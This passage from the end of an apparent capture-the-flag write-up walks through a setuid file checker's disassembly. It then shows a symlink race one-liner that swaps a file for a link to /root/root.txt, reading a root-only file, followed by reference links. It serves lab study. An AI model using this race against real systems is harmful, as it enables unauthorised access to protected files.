   0x0000000000400b93 &lt;+280&gt;:   call   0x4007a0 &lt;puts@plt&gt;
   0x0000000000400b98 &lt;+285&gt;:   jmp    0x400bb0 &lt;main+309&gt;
   0x0000000000400b9a &lt;+287&gt;:   mov    edi,0x400d1a
   0x0000000000400b9f &lt;+292&gt;:   call   0x4007a0 &lt;puts@plt&gt;
   0x0000000000400ba4 &lt;+297&gt;:   jmp    0x400bb0 &lt;main+309&gt;
   0x0000000000400ba6 &lt;+299&gt;:   mov    edi,0x400d2f
   0x0000000000400bab &lt;+304&gt;:   call   0x4007a0 &lt;puts@plt&gt;
   0x0000000000400bb0 &lt;+309&gt;:   mov    eax,0x0
   0x0000000000400bb5 &lt;+314&gt;:   leave
   0x0000000000400bb6 &lt;+315&gt;:   ret
End of assembler dump.
</pre></div></p>
<p>Besides the fact that we get a segmentation fault if we feed it a big enough file, what is also interesting here is that we see that <code>setuid</code> is called with 0 (i.e. root) as an argument. Also, we can see that there is a call to <code>sleep</code> for 1 second, which looks almost to good to be true. Apparently, what is going on is that the binary first checks whether we are user &lsquo;smasher&rsquo;, before calling setuid with 0, taking a nap for 1 second and finally read the file that we passed.</p>
<p>This sounds like a little symlink race. We end up with the following:</p>
<div class="codehilite"><pre>smasher@smasher:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">&quot;Too late&quot;</span> &gt; shell.php
smasher@smasher:~<span class="nv">$ </span>checker shell.php <span class="p">&amp;</span> <span class="o">(</span>sleep 0.1 <span class="o">&amp;&amp;</span> ln -sf /root/root.txt shell.php<span class="o">)</span>
<span class="o">[</span>+<span class="o">]</span> Welcome to file UID checker 0.1 by dzonerzy

File UID: 1001

Data:
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
</pre></div>

<hr />
<ol>
<li><a class="magiclink magiclink-github magiclink-issue" href="https://github.com/shenfeng/tiny-web-server/issues/2" title="GitHub Issue: shenfeng/tiny-web-server#2">shenfeng/tiny-web-server#2</a></li>
<li><a href="https://stackoverflow.com/a/28354265/2961949">https://stackoverflow.com/a/28354265/2961949</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-iii/">https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-iii/</a></li>
<li><a href="https://www.youtube.com/watch?v=6S4A2nhHdWg">https://www.youtube.com/watch?v=6S4A2nhHdWg</a></li>
<li><a href="http://www.pwntester.com/tag/pwnable/">http://www.pwntester.com/tag/pwnable/</a></li>
<li><a href="https://robertheaton.com/2013/07/29/padding-oracle-attack/">https://robertheaton.com/2013/07/29/padding-oracle-attack/</a></li>
</ol></article></body></html>